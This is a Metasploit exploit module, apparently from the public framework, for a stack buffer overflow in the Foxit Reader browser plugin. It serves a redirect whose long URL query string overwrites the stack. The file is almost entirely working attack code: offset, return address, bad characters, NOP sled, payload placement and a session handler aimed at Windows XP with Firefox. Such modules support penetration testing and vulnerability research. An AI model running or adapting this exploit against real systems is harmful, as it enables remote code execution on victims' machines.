##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpServer::HTML

  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Foxit Reader Plugin URL Processing Buffer Overflow",
      'Description'    => %q{
          This module exploits a vulnerability in the Foxit Reader Plugin
          npFoxitReaderPlugin.dll. When loading PDF files from remote hosts, overly long
          query strings within URLs can cause a stack-based buffer overflow, which can be
          exploited to execute arbitrary code. This exploit has been tested on Windows XP
          Home SP3 (german) with Firefox 18.0 and Foxit Reader version 5.4.4.1128
          (npFoxitReaderPlugin.dll version 2.2.1.530).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Andrea Micalizzi (rgod)', # initial discovery and poc
          'Sven Krewitt <svnk[at]krewitt.org>' # metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'http://retrogod.altervista.org/9sg_foxit_overflow.htm' ],
          [ 'URL', 'http://secunia.com/advisories/51733/' ],
          [ 'OSVDB', '89030' ]
        ],
      'Payload'        =>
        {
          'Space'    => 790, # TODO: exactly calculate available space
          'BadChars' => "\x7d\x00\x23\x25\x0a\x0d"
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC'         => "none",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP Home SP3 (german)',
            {
              'Offset' 	=> 230,
              'Ret' 		=> 0x0142318f 	# PopPopRet in
                            # npFoxitReaderPlugin.dll version 2.2.1.530
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 7 2013",
      'DefaultTarget'  => 0))
  end

  def on_request_uri(cli, request)
    return if ((p = regenerate_payload(cli)) == nil)

    sploit = rand_text_alpha(target['Offset'] - request.resource.length)
    sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2)
    sploit << [target.ret].pack('V')
    sploit << make_nops(8) + p.encoded
    sploit << rand_text_alpha(2300) # triggers access violation

    # we use two responses:
    # one for an HTTP 301 redirect and sending the payload
    # and one for sending the HTTP 200 OK with appropriate Content-Type

    if request.resource =~ /\.pdf$/
      # sending Content-Typ
      resp = create_response(200, "OK")
      resp.body = ""
      resp['Content-Type'] = 'application/pdf'
      resp['Content-Length'] = rand_text_numeric(3,"0")
      cli.send_response(resp)
      return
    else
      resp = create_response(301, "Moved Permanently")
      resp.body = ""
      resp['Location'] = request.uri + '.pdf?' + Rex::Text.uri_encode(sploit, 'hex-all')
      cli.send_response(resp)

      # handle the payload
      handler(cli)
    end
  end

end
